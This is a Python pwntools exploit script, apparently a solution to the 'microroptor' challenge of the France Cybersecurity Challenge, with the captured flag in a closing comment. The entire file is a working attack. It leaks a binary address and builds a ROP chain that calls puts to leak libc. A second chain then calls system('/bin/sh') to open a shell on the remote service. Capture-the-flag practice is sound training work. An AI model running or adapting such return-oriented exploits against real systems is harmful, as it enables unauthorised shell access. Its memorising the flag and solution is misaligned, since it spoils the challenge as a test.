#!/usr/bin/env python3

from pwn import *

exe = ELF("./microroptor")
# libc = ELF("/usr/lib/libc.so.6")
libc = ELF("libc/libc6_2.31-13_amd64.so")

context.binary = exe.path
context.terminal = ["tmux", "new-window"]


def conn():
    if args.REMOTE:
        r = remote("challenges.france-cybersecurity-challenge.fr", 2052)
    else:
        r = process([exe.path])

    return r

def attach_gdb():
    if args.GDB:
        gdb.attach(r, gdbscript="""
source ~/.gdbinit-gef.py
b*main+0x75
        """)


def main():
    global r
    r = conn()
    attach_gdb()

    exe.symbols["main"] = 0x1178
    leak = int(r.recvline().strip(), 16)
    exe.address = leak - (exe.bss()-0x8)
    info(f"exe @ {hex(exe.address)}")

    pop_rdi_ret = p64(exe.address + 0x000000000000116f)

    rop = b"A"*0x20 # buffer
    rop += b"B"*8 # saved rbp
    rop += pop_rdi_ret + p64(exe.got["puts"])
    rop += p64(exe.plt["puts"])
    rop += p64(exe.symbols["main"])
    r.sendline(rop)
    r.recvline()

    addr_puts = u64(r.recvline().strip().ljust(8, b"\x00"))
    info(f"puts @ {hex(addr_puts)}")
    libc.address = addr_puts - libc.symbols["puts"]
    info(f"libc @ {hex(libc.address)}")

    rop = b"A"*0x20 # buffer
    rop += b"B"*8 # saved rbp
    rop += pop_rdi_ret + p64(next(libc.search(b"/bin/sh\x00")))
    rop += p64(libc.symbols["system"])
    r.sendline(rop)

    r.interactive()

if __name__ == "__main__":
    main()

# FCSC{e3752da07f2c9e3a0f9ad69679792e5a8d53ba717a2652e29fb975fcf36f9258}
